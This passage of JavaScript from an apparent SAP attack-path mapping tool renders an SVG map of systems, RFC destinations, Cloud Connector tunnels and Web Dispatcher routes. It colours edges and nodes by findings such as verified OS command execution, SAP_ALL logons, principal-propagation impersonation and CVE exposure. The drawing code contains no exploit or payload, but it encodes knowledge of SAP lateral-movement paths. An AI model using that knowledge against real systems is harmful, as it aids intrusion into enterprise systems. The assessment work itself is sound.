    Object.entries(sccNodes).forEach(([host, sn]) => {
      addToZone(hostKey(sn), sn._x, sn._y, BOX_W, BOX_H, host, 'scc');
    });

    const PAD = 28;
    Object.entries(zoneMap).forEach(([key, members]) => {
      if (members.length < 2) return;
      const xs = members.map(m => m.x);
      const ys = members.map(m => m.y);
      const zx = Math.min(...xs) - PAD;
      const zy = Math.min(...ys) - PAD - 18;  // 18px headroom for label
      const zw = Math.max(...members.map(m => m.x + m.w)) + PAD - zx;
      const zh = Math.max(...members.map(m => m.y + m.h)) + PAD - zy;

      // Subtle dark-teal zone fill + dashed border
      html += `<rect x="${zx}" y="${zy}" width="${zw}" height="${zh}" ` +
              `rx="14" fill="#111e26" fill-opacity="0.55" ` +
              `stroke="#2e5060" stroke-width="1.5" stroke-dasharray="7,4" />`;

      // Label: prefer "IP (hostname)" when we have both distinct
      // pieces of info, else fall back to whichever we have.
      const allNodes = [
        ...Object.values(nodes).filter(n => hostKey(n) === key),
        ...Object.values(sccNodes).filter(sn => hostKey(sn) === key),
      ];
      const ipHint   = allNodes.map(x => x.ip || '')
                                 .find(v => IP_RE.test(v)) || '';
      const hostHint = allNodes.map(x => x.hostname || x.host || '')
                                 .find(v => v && !IP_RE.test(v)) || '';
      let labelText;
      if (ipHint && hostHint) labelText = `${ipHint}  (${hostHint})`;
      else if (ipHint)         labelText = ipHint;
      else                     labelText = hostHint || key;
      const typeIcons = [...new Set(members.map(m =>
        m.nodeType === 'scc' ? '⬡ SCC' : '▣ SAP')
      )].join('  ');

      html += `<text x="${zx + 12}" y="${zy + 14}" ` +
              `fill="#4a7a8a" font-size="10" font-weight="bold" ` +
              `font-family="monospace" pointer-events="none">` +
              `🖥 ${escHtml(labelText)}</text>`;
      html += `<text x="${zx + zw - 8}" y="${zy + 14}" ` +
              `text-anchor="end" fill="#2e5060" font-size="9" ` +
              `font-family="monospace" pointer-events="none">` +
              `${escHtml(typeIcons)}</text>`;
    });
  }
  // ─────────────────────────────────────────────────────────────────────────

  // Draw connections first (behind nodes)
  const newConnKeys = new Set();
  // Resolve BTP-sentinel source SIDs ("BTP:<uuid8>") against the
  // btp_subaccounts dict so synthetic BTP→on-prem edges from
  // link_destinations_to_onprem actually render.
  const _resolveBtpSrc = (sid) => {
    if (!sid || !sid.startsWith('BTP:')) return null;
    const suffix = sid.slice(4);
    for (const u in btpNodes) {
      if (u.startsWith(suffix)) return btpNodes[u];
    }
    return null;
  };
  conns.forEach((conn, ci) => {
    // `ci` here is an index into the FILTERED conns array (used
    // internally for pairIdx bookkeeping + marker IDs).  The click
    // handler `showConnInfo` looks up by index into the UNFILTERED
    // mapState.connections, so we compute the true index once and
    // use it in every onclick binding below.  Without this rebase
    // any filtered-out connection (bare-AWS default, edge to hidden
    // node) shifts every subsequent arrow's click target to a
    // different connection — e.g. clicking "test → WAS" opens the
    // details of an unrelated "S4A → S4H" destination.
    const realCi = (mapState.connections || []).indexOf(conn);
    let srcNode = nodes[conn.source_sid] || _resolveBtpSrc(conn.source_sid);
    // Target lookup falls through btpNodes when the destination points
    // at a *.hana.ondemand.com host — those live in state.btp_subaccounts
    // as cloud-shaped nodes, not in state.nodes as rectangles.
    let tgtNode = nodes[conn.target_sid]
      || btpNodes[conn.target_sid]
      || _resolveBtpSrc(conn.target_sid);

    if (!tgtNode && showUnknown) {
      const key = conn.target_host || conn.target_sid || '';
      tgtNode = unknownTargets[key];
    }
    if (!srcNode || !tgtNode) return;

    const connKey = conn.source_sid + '|' + conn.destination_name;
    newConnKeys.add(connKey);
    const isNewConn = !firstRender && !prevConns.has(connKey);
    const newAttr = isNewConn ? ' data-new="1"' : '';

    // Base widths bumped uniformly by +2 so every destination edge is
    // easier to click.  Preserves the relative hierarchy
    // (OS-exec > SAP_ALL > SAPXPG > trusted > logon > HTTP > default).
    let color = '#5dade2';
    let width = 6;
    let dashArray = '';
    const isHttp = (conn.conn_type || '') === 'http';
    const isTrusted = !!conn.trusted_system;
    if (conn.os_exec_verified) {
      // OS shell as <sid>adm via SAPControl OSExecute — beats
      // SAP_ALL (kernel vs application level).  Deep red + thick.
      color = '#c0392b'; width = 9;
    } else if (conn.has_sap_all && conn.logon_successful) {
      color = '#e74c3c'; width = 8;
    } else if (conn.sapxpg_remote_works) {
      color = '#ff6b35'; width = 7.5; dashArray = '8,4';
    } else if (isTrusted) {
      color = '#f0883e'; width = 7; dashArray = '12,4';
    } else if (conn.logon_successful) {
      color = '#2ecc71'; width = 7;
    } else if (isHttp) {
      color = '#a371f7'; width = 6; dashArray = '2,2';
    }

    // Direction markers.  Two problems the earlier single-arrow
    // version had:
    //   * on dashed lines (Type-G/H HTTP, BTP back-edges) the tiny
    //     14×10 arrow-head was hard to distinguish from the last
    //     dash, especially when several parallel curves overlap
    //   * with A→B and B→A curves fanning to opposite sides, only
    //     the arrow-head tells them apart, and small heads make
    //     "who initiates" hard to read at a glance
    //
    // Solution: two markers per edge.  A SOURCE marker (filled
    // circle "bullet") at the origin, plus a LARGER arrow-head at
    // the destination.  Convention borrowed from UML — bullet =
    // start, arrow = end.  Zero ambiguity even on dashed edges
    // and even when hovering multiple parallel curves.
    html += `<defs>` +
      `<marker id="arrow-${ci}" markerWidth="18" markerHeight="12" ` +
        `refX="17" refY="6" orient="auto" markerUnits="userSpaceOnUse">` +
        `<polygon points="0 0, 18 6, 0 12" fill="${color}"/>` +
      `</marker>` +
      `<marker id="src-${ci}" markerWidth="10" markerHeight="10" ` +
        `refX="5" refY="5" orient="auto" markerUnits="userSpaceOnUse">` +
        `<circle cx="5" cy="5" r="4" fill="${color}" ` +
                `stroke="#0d1117" stroke-width="1"/>` +
      `</marker>` +
      `</defs>`;

    const dashAttr = dashArray ? ` stroke-dasharray="${dashArray}"` : '';

    // Self-loop: source and target are the same node
    const isSelf = conn.source_sid && conn.source_sid === conn.target_sid;
    if (isSelf) {
      const nx = srcNode._x || 0, ny = srcNode._y || 0;
      // Count self-loops on this node for stacking
      const selfKey = conn.source_sid + '|' + conn.source_sid;
      const selfTotal = pairCount[selfKey] || 1;
      const selfIdx = pairIdx[ci] || 0;
      // Loop exits right side, arcs out and comes back
      const loopR = 30 + selfIdx * 20;
      const startY = ny + BOX_H * 0.3 + selfIdx * 12;
      const endY = ny + BOX_H * 0.7 + selfIdx * 12;
      // Clamp to box height
      const sy = Math.min(startY, ny + BOX_H - 4);
      const ey = Math.min(endY, ny + BOX_H - 4);
      const sx = nx + BOX_W;  // right edge
      const cpx = sx + loopR;
      html += `<path class="edge-line" d="M${sx},${sy} C${cpx},${sy} ${cpx},${ey} ${sx},${ey}" ` +
        `stroke="${color}" stroke-width="${width}" fill="none"${dashAttr}${newAttr} data-orig-dash="${dashArray}" ` +
        `marker-start="url(#src-${ci})" marker-end="url(#arrow-${ci})" data-conn-idx="${realCi}" ` +
        `onclick="showConnInfo(event, ${realCi})" />`;
      // Mid-loop direction arrow.  Cubic Bezier P0→P1→P2→P3 with
      // P0=(sx,sy), P1=P2=(cpx,sy)/(cpx,ey), P3=(sx,ey).  At t=0.5
      // the point simplifies to (cpx·0.75 + sx·0.25, (sy+ey)/2) —
      // the rightmost point of the arc.  Tangent is vertical
      // pointing down (from sy toward ey), so orient with dy>0.
      html += midArrow(sx * 0.25 + cpx * 0.75, (sy + ey) / 2, 0, 1, 8);
      // Label to the right of the loop
      let label = conn.destination_name || '';
      if (conn.rfc_user) label += ' / ' + conn.rfc_user;
      if (conn.has_sap_all) label += ' (SAP_ALL)';
      const lx = cpx + 4, ly = (sy + ey) / 2 + 3;
      html += `<text x="${lx}" y="${ly}" text-anchor="start" font-size="10" ` +
        `fill="#8b949e" font-family="monospace" pointer-events="none">${escHtml(label)}</text>`;
      return;  // done with this self-loop connection
    }

    const cx1 = (srcNode._x || 0) + BOX_W / 2;
    const cy1 = (srcNode._y || 0) + BOX_H / 2;
    const cx2 = (tgtNode._x || 0) + BOX_W / 2;
    const cy2 = (tgtNode._y || 0) + BOX_H / 2;

    // Clip line endpoints to box edges so arrows are visible
    function clipToBox(fromX, fromY, toX, toY, bw, bh) {
      const dx = fromX - toX, dy = fromY - toY;
      const len = Math.sqrt(dx*dx + dy*dy) || 1;
      const ux = dx / len, uy = dy / len;
      const hw = bw / 2, hh = bh / 2;
      const sx = ux !== 0 ? hw / Math.abs(ux) : Infinity;
      const sy = uy !== 0 ? hh / Math.abs(uy) : Infinity;
      const s = Math.min(sx, sy);
      return { x: toX + ux * s, y: toY + uy * s };
    }
    const src = clipToBox(cx2, cy2, cx1, cy1, BOX_W, BOX_H);
    const tgt = clipToBox(cx1, cy1, cx2, cy2, BOX_W, BOX_H);
    const x1 = src.x, y1 = src.y, x2 = tgt.x, y2 = tgt.y;

    // Determine curve offset for parallel connections
    // Use canonical (sorted) direction for the perpendicular so that
    // A→B and B→A connections curve to opposite sides instead of overlapping.
    // Canonicalise both sides so BTP-sentinel sids fold into the same
    // pair bucket as real-uuid target ids (see _pairKey above).
    const a = _canonicalNodeKey(conn.source_sid || '');
    const b = _canonicalNodeKey(conn.target_sid || conn.target_host || '');
    const pairKey = _pairKey(conn);
    const total = pairCount[pairKey] || 1;
    const idx = pairIdx[ci] || 0;

    // Helper to render a mid-line arrow polygon.  Operator report
    // (2026-07-12): the source-bullet marker gets covered by the
    // SAP box outline when the line originates inside the box (the
    // clipToBox trim leaves the marker on the box border, and the
    // box's own fill sits on top).  A mid-line arrow is always
    // visible regardless of endpoint clipping, so use it as the
    // primary direction indicator.
    //
    // Args:
    //   mx,my   — polygon centre (arrow midpoint)
    //   dx,dy   — direction vector (source→target), used for
    //             rotation angle
    //   size    — apex length (px)
    // Emits a filled triangle pointing along dx,dy with a thin
    // canvas-coloured stroke so it stays crisp on dashed lines.
    function midArrow(mx, my, dx, dy, size) {
      const a = Math.atan2(dy, dx) * 180 / Math.PI;
      const s = size || 8;
      // Triangle points along +X in local coords: apex at (s,0),
      // base at (-s*0.7,-s*0.7) to (-s*0.7,s*0.7).
      return `<polygon points="${s},0 ${-s*0.7},${-s*0.7} ${-s*0.7},${s*0.7}" ` +
        `fill="${color}" stroke="#0d1117" stroke-width="1" ` +
        `transform="translate(${mx.toFixed(1)},${my.toFixed(1)}) rotate(${a.toFixed(1)})" ` +
        `pointer-events="none" />`;
    }

    if (total === 1) {
      // Invisible wider hit area for dashed/dotted lines
      if (dashArray) {
        html += `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" ` +
          `stroke="transparent" stroke-width="${width + 10}" ` +
          `data-conn-idx="${realCi}" onclick="showConnInfo(event, ${realCi})" />`;
      }
      html += `<line class="edge-line" x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" ` +
        `stroke="${color}" stroke-width="${width}" fill="none"${dashAttr}${newAttr} data-orig-dash="${dashArray}" ` +
        `marker-start="url(#src-${ci})" marker-end="url(#arrow-${ci})" data-conn-idx="${realCi}" ` +
        `onclick="showConnInfo(event, ${realCi})" />`;
      // Mid-line direction arrow — visible even when the source
      // bullet is behind the source box.
      html += midArrow((x1+x2)/2, (y1+y2)/2, x2-x1, y2-y1, 8);
    } else {
      const mx = (x1 + x2) / 2, my = (y1 + y2) / 2;
      // Canonical direction: always from alphabetically smaller to larger SID
      const cdx = a < b ? (cx2 - cx1) : (cx1 - cx2);
      const cdy = a < b ? (cy2 - cy1) : (cy1 - cy2);
      const len = Math.sqrt(cdx*cdx + cdy*cdy) || 1;
      // Perpendicular based on canonical direction (consistent for both A→B and B→A)
      const px = -cdy / len, py = cdx / len;
      // Curve-spread multiplier — grows with edge count so 3+
      // parallel edges don't collapse onto the straight-line axis,
      // but capped so 8+ parallel RFCs (real on landscapes with
      // many destinations between two systems) don't blow the fan
      // out to hundreds of pixels of empty space.  Operator report
      // 2026-07-09: 8 parallel destinations between AED and AE1
      // had outermost curves at ±560 px — labels floated in a void
      // above/below the actual nodes.
      //
      // maxSpread caps TOTAL fan width; maxCurveMul caps per-edge
      // step so 2-3 parallel edges keep the readable ±20/±80
      // spacing they had before.  Beyond that, step shrinks so
      // the fan grows only linearly at first, then plateaus at
      // ±maxSpread/2.
      //
      // Bumped 500/60 → 700/80 on 2026-07-09 after operator report
      // that ~10 parallel destinations between AED and AE1 were
      // still bunching labels together at the current cap.
      //
      // With maxSpread=700 / maxCurveMul=80:
      //   2 edges → ±20    (unchanged; hardcoded)
      //   3 edges → ±80    (was ±60)
      //   4 edges → ±120   (was ±90)
      //   6 edges → ±200   (was ±150)
      //   8 edges → ±280   (was ±210)
      //  12 edges → ±350   (was ±227)
      //  15 edges → ±350   (was ±250)
      const maxCurveMul = 80;
      const maxSpread = 700;
      const curveMul = total <= 2
        ? 40
        : Math.min(maxCurveMul, maxSpread / (total - 1));
      const offset = (idx - (total - 1) / 2) * curveMul;
      const qx = mx + px * offset, qy = my + py * offset;
      // Invisible wider hit area for dashed/dotted lines
      if (dashArray) {
        html += `<path d="M${x1},${y1} Q${qx},${qy} ${x2},${y2}" ` +
          `stroke="transparent" stroke-width="${width + 10}" fill="none" ` +
          `data-conn-idx="${realCi}" onclick="showConnInfo(event, ${realCi})" />`;
      }
      html += `<path class="edge-line" d="M${x1},${y1} Q${qx},${qy} ${x2},${y2}" ` +
        `stroke="${color}" stroke-width="${width}" fill="none"${dashAttr}${newAttr} data-orig-dash="${dashArray}" ` +
        `marker-start="url(#src-${ci})" marker-end="url(#arrow-${ci})" data-conn-idx="${realCi}" ` +
        `onclick="showConnInfo(event, ${realCi})" />`;
      // Mid-line direction arrow on the curve.  For a quadratic
      // Bezier P0→P1→P2, the point at t=0.5 is
      // (P0 + 2·P1 + P2) / 4 — offset from the straight-line
      // midpoint toward the control point by half the control
      // offset.  Tangent direction at t=0.5 is (P2 - P0), so the
      // source→target vector suffices for the rotation.  Result:
      // each fanned parallel edge gets its own visible arrow sitting
      // right on top of its own curve, not the straight-line axis.
      const arrowMx = (x1 + 2*qx + x2) / 4;
      const arrowMy = (y1 + 2*qy + y2) / 4;
      html += midArrow(arrowMx, arrowMy, x2 - x1, y2 - y1, 8);
    }

    // Connection label at midpoint
    const mx2 = (x1 + x2) / 2, my2 = (y1 + y2) / 2;
    let lx = mx2, ly = my2 - 6;
    if (total > 1) {
      const cdx2 = a < b ? (cx2 - cx1) : (cx1 - cx2);
      const cdy2 = a < b ? (cy2 - cy1) : (cy1 - cy2);
      const len2 = Math.sqrt(cdx2*cdx2 + cdy2*cdy2) || 1;
      const px2 = -cdy2 / len2, py2 = cdx2 / len2;
      // Mirror the curveMul used for the edge path so labels stay
      // on their own curves when total > 2.  Constants MUST match
      // the edge-path block above — a drift would put labels on
      // wrong curves.
      const maxCurveMul2 = 80;
      const maxSpread2 = 700;
      const curveMul2 = total <= 2
        ? 40
        : Math.min(maxCurveMul2, maxSpread2 / (total - 1));
      const off2 = (idx - (total - 1) / 2) * curveMul2;
      // Perpendicular offset onto the Q-bezier midpoint.  Bumped
      // from 0.5→0.75 (2026-07-09) so labels sit closer to the
      // peak of their own curve — at 0.5 the label was midway
      // between the axis and the curve peak, which for wide fans
      // put it visually between two curves and made it hard to
      // tell which line the label belonged to.
      const perpX = px2 * off2 * 0.75;
      const perpY = py2 * off2 * 0.75;
      // Along-axis stagger: distribute labels a little along the
      // line so 3+ nearly-parallel labels don't stack on top of
      // each other.  Fix for BTP→on-prem clusters where multiple
      // synthetic edges from the same subaccount to the same SAP
      // node use the identical (source_sid, target_sid) pair.
      //
      // Trimmed 80/0.15 → 25/0.04 (2026-07-09) after operator
      // report: for 15 destinations on a ~1500 px line, the old
      // formula pushed idx=0 labels 560 px along-axis (75% of edge
      // length!) — labels floated above/left of the source box
      // instead of sitting near the middle of their curves.  New
      // formula keeps stagger under 15% of edge length.
      const dux = (cx2 - cx1) / len2, duy = (cy2 - cy1) / len2;
      const stagger = (idx - (total - 1) / 2) * Math.min(25, len2 * 0.04);
      lx = mx2 + perpX + dux * stagger;
      ly = my2 + perpY + duy * stagger - 6;
    }
    // Strip the "BTP:<uuid8>::" prefix that link_destinations_to_onprem
    // stamps onto synthetic BTP→on-prem destination_names.  The source
    // node in the label position already tells the operator which BTP
    // subaccount owns the destination; the prefix is redundant and
    // was making labels wide enough to overlap with sibling edges.
    let label = (conn.destination_name || '').replace(
        /^BTP:[0-9a-f]{8}::/i, '');
    if (conn.rfc_user) label += ' / ' + conn.rfc_user;
    if (conn.trusted_system) label += ' (Trusted)';
    else if (conn.has_sap_all) label += ' (SAP_ALL)';
    html += `<text x="${lx}" y="${ly}" text-anchor="middle" font-size="10" ` +
      `fill="#8b949e" font-family="monospace" pointer-events="none">${escHtml(label)}</text>`;
  });

  // --- SCC → SAP-node edges (Cloud Connector tunnel mappings) ---
  Object.keys(nodes).forEach(sid => {
    const n = nodes[sid];
    const links = n.scc_links || [];
    if (!links.length) return;
    const tx = (n._x || 0) + BOX_W / 2, ty = (n._y || 0) + BOX_H / 2;
    links.forEach(sccHost => {
      const sn = (mapState.scc_nodes || {})[sccHost];
      if (!sn) return;
      const sx = (sn._x || 0) + BOX_W / 2, sy = (sn._y || 0) + BOX_H / 2;
      // List the mappings between this SCC and this SAP node.
      // Mapping-level SID is authoritative (a single IP often hosts
      // multiple SIDs); host/ip only used as fallback when SID is empty.
      const matches = (sn.mappings || []).filter(m => {
        if (!m) return false;
        const msid = (m.sid || '').toUpperCase();
        if (msid) return msid === (n.sid || '').toUpperCase();
        const ih = m.internal_host || '';
        return ih === n.hostname || ih === n.ip;
      });
      if (!matches.length) return;
      const ppHi = matches.some(m => m.principal_propagation);
      // Reachability tally — derived from sapmap_scc_relay probe results.
      const probed = matches.filter(m => m.reachable === true || m.reachable === false);
      const reachOk = matches.filter(m => m.reachable === true).length;
      const reachBad = matches.filter(m => m.reachable === false).length;
      const allProbed = probed.length === matches.length;
      // PP impersonation has been LIVE-VERIFIED through this exact
      // SCC: paints the edge solid red as the killer signal.
      const ppVerified = !!n.pp_verification_confirmed
            && ((n.pp_verification || {}).scc_host === sccHost);
      // Color priority: solid red (live-verified PP) > red dashed (any unreachable) >
      // green (all reach probed OK) > orange (PP, not yet probed) > teal (default).
      let stroke, labelColor, dashArrayPP;
      if (ppVerified)                         { stroke = '#f85149'; labelColor = '#f85149'; dashArrayPP = ''; }
      else if (reachBad > 0)                  { stroke = '#f85149'; labelColor = '#f85149'; dashArrayPP = '6,4'; }
      else if (allProbed && reachOk)          { stroke = '#3fb950'; labelColor = '#3fb950'; dashArrayPP = '6,4'; }
      else if (ppHi)                          { stroke = '#f0883e'; labelColor = '#f0883e'; dashArrayPP = '6,4'; }
      else                                    { stroke = '#046c7a'; labelColor = '#9bb1c4'; dashArrayPP = '6,4'; }
      const width = (ppVerified ? 6 : (ppHi || reachBad > 0 || (allProbed && reachOk)) ? 5 : 4);
      // Bundled-with-badge: one line per (SCC, SAP) pair regardless of how
      // many mappings traverse it.  Label shows mapping count and (when
      // probed) a reach badge "X/Y reach".
      const baseLabel = matches.length === 1
        ? `${matches[0].virtual_host}:${matches[0].virtual_port} → ${matches[0].internal_host}:${matches[0].internal_port}`
        : `${matches.length} mappings`;
      const reachBadge = probed.length > 0
        ? ` · ${reachOk}/${matches.length} reach`
        : '';
      const ppBadge = ppVerified ? ' [PP CONFIRMED]' : (ppHi ? ' [PP]' : '');
      const dashAttr = dashArrayPP ? ` stroke-dasharray="${dashArrayPP}"` : '';
      html += `<line class="edge-line" x1="${sx}" y1="${sy}" x2="${tx}" y2="${ty}" ` +
        `stroke="${stroke}" stroke-width="${width}"${dashAttr} fill="none" ` +
        `pointer-events="none" />`;
      const mx = (sx + tx) / 2, my = (sy + ty) / 2;
      html += `<text x="${mx}" y="${my - 4}" text-anchor="middle" font-size="10" ` +
        `fill="${labelColor}" font-family="monospace" pointer-events="none">SCC: ${escHtml(baseLabel)}${reachBadge}${ppBadge}</text>`;
    });
  });

  // --- WD → backend edges (Web Dispatcher routing topology) ---
  // For every node that is_web_dispatcher and has wd_backends entries
  // with a linked_node_sid, draw an edge from the WD to the linked
  // SAPNode.  Edge label shows the count of URL prefixes routed to
  // that backend (e.g. "WD: 4 prefixes" or
  // "WD: /sap/*, /nwa/*" when there are few enough to fit).
  // Backends without a linked_node_sid (i.e. the backend isn't on the
  // map yet) are NOT drawn here — they appear in the details panel
  // and engagement report only, to keep the SVG clean.
  Object.keys(nodes).forEach(wsid => {
    const wn = nodes[wsid];
    if (!wn.is_web_dispatcher) return;
    const backends = wn.wd_backends || [];
    if (!backends.length) return;
    const sx = (wn._x || 0) + BOX_W / 2;
    const sy = (wn._y || 0) + BOX_H / 2;
    backends.forEach(bk => {
      const targetSid = (bk.linked_node_sid || '').toUpperCase();
      if (!targetSid) return;
      const tn = nodes[targetSid];
      if (!tn) return;
      const tx = (tn._x || 0) + BOX_W / 2;
      const ty = (tn._y || 0) + BOX_H / 2;
      // Edge style: cyan to match the WEB_DISPATCHER node colour;
      // dashed when the backend's Server header was suppressed
      // (less certain about identity); solid otherwise.
      const stroke = '#4d9eb6';
      const dash = bk.is_suppressed ? ' stroke-dasharray="4,3"' : '';
      html += `<line class="edge-line" x1="${sx}" y1="${sy}" ` +
        `x2="${tx}" y2="${ty}" stroke="${stroke}" stroke-width="4"` +
        `${dash} fill="none" pointer-events="none" />`;
      const mx = (sx + tx) / 2, my = (sy + ty) / 2;
      // Prefer the admin-table SRCURL (authoritative from
      // wdisp/system_*) over the Server-header bucket's
      // url_prefixes (inferred from per-path probes).  The bucket
      // can collapse multiple real backends into one entry; the
      // admin SRCURL is per-system, so it's the right per-edge
      // label when available.
      let prefixes = [];
      if (bk.wd_srcurl) {
        prefixes = bk.wd_srcurl.split(';')
          .map(s => s.trim())
          .filter(s => s.length > 0);
      }
      if (!prefixes.length) prefixes = bk.url_prefixes || [];

      // Render as a stacked block of <tspan> lines so the entire
      // SRCURL list is visible — `WD: /nwa/`, `/webdynpro/`,
      // `/UserAdmin/`, etc.  Cap at 6 visible lines + "+N more" so
      // very wide WD configs don't dominate the map.  Full list
      // available on hover via <title>.
      const MAX_LINES = 6;
      const lineH = 11;          // px between lines
      const lines = ['WD:'];
      if (prefixes.length === 0) {
        lines[0] = 'WD route';
      } else {
        for (let i = 0; i < prefixes.length && i < MAX_LINES; i++) {
          lines.push(prefixes[i] || '<catch-all>');
        }
        if (prefixes.length > MAX_LINES) {
          lines.push(`+${prefixes.length - MAX_LINES} more`);
        }
      }
      // Centre the block vertically around the edge midpoint.
      // pointer-events="auto" so the SVG <title> tooltip fires on
      // hover (the default for SVG <text> is "visiblePainted" which
      // works, but inheriting from a parent <g> with pointer-events
      // disabled would block it — set it explicitly to be safe).
      const totalH = lines.length * lineH;
      const startY = my - (totalH / 2) - 2;
      html += `<text x="${mx}" y="${startY}" text-anchor="middle" ` +
        `font-size="10" fill="#9bb1c4" font-family="monospace" ` +
        `style="cursor: help" pointer-events="auto">`;
      html += `<title>${escHtml('WD ' + wn.sid + ' → backend ' +
                                  tn.sid + '\n\nSRCURL prefixes ('
                                  + prefixes.length + '):\n  '
                                  + prefixes.join('\n  '))}</title>`;
      lines.forEach((line, i) => {
        html += `<tspan x="${mx}" dy="${i === 0 ? 0 : lineH}">`
              + escHtml(line) + `</tspan>`;
      });
      html += `</text>`;
    });
  });

  // --- SCC ↔ BTP-subaccount edges (Cloud Connector → cloud tunnel) ---
  // SCCNode.subaccount_uuids is authoritative; fall back to
  // BTPSubaccountNode.scc_locations[].scc_host_uuid matching the SCC host.
  Object.keys(sccNodes).forEach(host => {
    const sn = sccNodes[host];
    const sccUuids = (sn.subaccount_uuids || []).map(u => (u || '').toLowerCase());
    btpKeys.forEach(uuid => {
      const bn = btpNodes[uuid];
      const uuidLc = (uuid || '').toLowerCase();
      let matched = sccUuids.includes(uuidLc);
      let locId = '';
      if (!matched) {
        const locs = bn.scc_locations || [];
        for (const loc of locs) {
          const sh = ((loc && loc.scc_host_uuid) || '').toLowerCase();
          if (sh && (sh === host.toLowerCase() || sh === (sn.host || '').toLowerCase())) {
            matched = true;
            locId = loc.location_id || '';
            break;
          }
        }
      }
      if (!matched) return;
      const sx = (sn._x || 0) + BOX_W / 2;
      const sy = (sn._y || 0) + BOX_H / 2;
      const tx = (bn._x || 0) + BOX_W / 2;
      const ty = (bn._y || 0) + BOX_H / 2;
      html += `<line class="edge-line" x1="${sx}" y1="${sy}" x2="${tx}" y2="${ty}" ` +
        `stroke="#5dade2" stroke-width="4.5" stroke-dasharray="4,4" fill="none" ` +
        `pointer-events="none" />`;
      const mx = (sx + tx) / 2, my = (sy + ty) / 2;
      const lbl = locId ? `SCC tunnel: ${locId}` : 'SCC tunnel';
      html += `<text x="${mx}" y="${my - 4}" text-anchor="middle" font-size="10" ` +
        `fill="#5dade2" font-family="monospace" pointer-events="none">${escHtml(lbl)}</text>`;
    });
  });

  // --- SCC HA shadow links (master ↔ shadow) ---
  // Draw once per pair: only emit from the host with the lexicographically
  // smaller name to avoid duplicate overlapping segments.
  const drawnHA = {};
  Object.keys(sccNodes).forEach(host => {
    const sn = sccNodes[host];
    const peer = sn.ha_shadow_host || '';
    if (!peer) return;
    const pn = sccNodes[peer];
    if (!pn) return;
    const pairKey = [host, peer].sort().join('|');
    if (drawnHA[pairKey]) return;
    drawnHA[pairKey] = true;
    const ax = (sn._x || 0) + BOX_W / 2, ay = (sn._y || 0) + BOX_H / 2;
    const bx = (pn._x || 0) + BOX_W / 2, by = (pn._y || 0) + BOX_H / 2;
    // Solid violet line — distinct from the teal/orange/red SCC→SAP edges.
    html += `<line class="edge-line" x1="${ax}" y1="${ay}" x2="${bx}" y2="${by}" ` +
      `stroke="#a371f7" stroke-width="4" stroke-dasharray="2,3" fill="none" pointer-events="none" />`;
    const mx = (ax + bx) / 2, my = (ay + by) / 2;
    const roleA = (sn.ha_role || '?').toUpperCase();
    const roleB = (pn.ha_role || sn.ha_peer_role || '?').toUpperCase();
    html += `<text x="${mx}" y="${my - 4}" text-anchor="middle" font-size="10" ` +
      `fill="#a371f7" font-family="monospace" pointer-events="none">HA: ${escHtml(roleA)} ⇄ ${escHtml(roleB)}</text>`;
  });

  // Draw nodes
  nodeKeys.forEach(sid => {
    const n = nodes[sid];
    const x = n._x || 0, y = n._y || 0;
    const isScanning = !!(activeTasks[sid + ':retrieve_rfcs']);
    // Track new nodes for fade-in (persists across re-renders)
    if (!firstRender && !prevNodes.has(sid) && !fadingNodes[sid]) {
      fadingNodes[sid] = { start: Date.now(), duration: 5000 };
    }
    const fadeInfo = fadingNodes[sid];
    const isFading = !!fadeInfo;
    let nodeOpacity = 1;
    if (isFading) {
      const elapsed = Date.now() - fadeInfo.start;
      nodeOpacity = Math.min(1, elapsed / fadeInfo.duration);
      if (nodeOpacity >= 1) delete fadingNodes[sid]; // done fading
    }

    // Determine colors
    let fill = '#16213e';
    let borderColor = '#2ecc71';
    let borderWidth = 4;
    // BTP-discovery placeholder: muted fill + dashed amber border so
    // operators can tell at a glance which nodes came from a BTP
    // destination but haven't been independently scanned yet.
    const isBtpDiscovered = !!n.discovered_via_btp;
    // WD-discovery placeholder: synthesised from a Web Dispatcher's
    // backend routing topology when no real on-map node matched the
    // backend's Server-header signature.  We know SOMETHING is back
    // there (the WD's Server header proved it) but the wire-level
    // data is too thin to invent a real SID/IP/hostname.
    const isWdDiscovered = !!n.discovered_via_wd_sid;
    let nodeDash = '';
    if (isBtpDiscovered) {
      fill = '#1f2333';
      borderColor = '#a371f7';
      borderWidth = 3;
      nodeDash = ' stroke-dasharray="8,5"';
    } else if (isWdDiscovered) {
      // Cyan-ish dashed border that matches the WD's own color
      // scheme; lighter fill so the placeholder visually recedes
      // compared to confirmed-on-the-wire nodes.
      fill = '#16213e';
      borderColor = '#4d9eb6';
      borderWidth = 3;
      nodeDash = ' stroke-dasharray="6,4"';
    }

    if (n.is_production) fill = '#4a1a1a';
    else if (Object.keys(n.clients || {}).length > 0) fill = '#4a3a1a';

    if (n.pwned || n.has_critical_finding || n.gw_vulnerable || n.ms_vulnerable || n.cve_2025_31324_vulnerable || n.cve_2020_6287_vulnerable || n.cve_2022_22536_vulnerable) { borderColor = '#8b0000'; borderWidth = 6; }
    // cert_auth_trusted = kernel-proxied cert-auth reached this
    // target with a non-2xx response (TLS handshake succeeded,
    // endpoint denied).  Distinguishes "our cert is trusted at the
    // transport layer" from "we authenticated AND authorized"
    // (which flips pwned/has_critical_finding red above).  Purple
    // matches the 🔐 Probe Cert-Auth button colour on the modal.
    else if (n.cert_auth_trusted) { borderColor = '#8b3aad'; borderWidth = 5; }

    // Scanning radar pulse + probe lines (behind node)
    if (isScanning) {
      const pcx = x + BOX_W/2, pcy = y + BOX_H/2;
      // Radar pulse ring
      html += `<circle cx="${pcx}" cy="${pcy}" fill="none" stroke="#f0883e" stroke-width="2">` +
        `<animate attributeName="r" from="20" to="160" dur="1.2s" fill="freeze" />` +
        `<animate attributeName="opacity" from="0.5" to="0" dur="1.2s" fill="freeze" />` +
        `</circle>`;
      // Fake probe lines shooting out in random directions (styled like RFC connections)
      const probeCount = 5 + Math.floor(Math.random() * 3);
      for (let p = 0; p < probeCount; p++) {
        const angle = Math.random() * Math.PI * 2;
        const dist = 150 + Math.random() * 250;
        const ex = pcx + Math.cos(angle) * dist;
        const ey = pcy + Math.sin(angle) * dist;
        const dur = (0.5 + Math.random() * 0.4).toFixed(2);
        html += `<line x1="${pcx}" y1="${pcy}" x2="${ex}" y2="${ey}" ` +
          `stroke="#5dade2" stroke-width="4">` +
          `<animate attributeName="opacity" values="0;0.6;0" dur="${dur}s" repeatCount="indefinite" />` +
          `</line>`;
      }
    }

    // Node group
    html += `<g class="node-box" data-sid="${sid}" ${isFading ? `opacity="${nodeOpacity.toFixed(2)}"` : ''} ` +
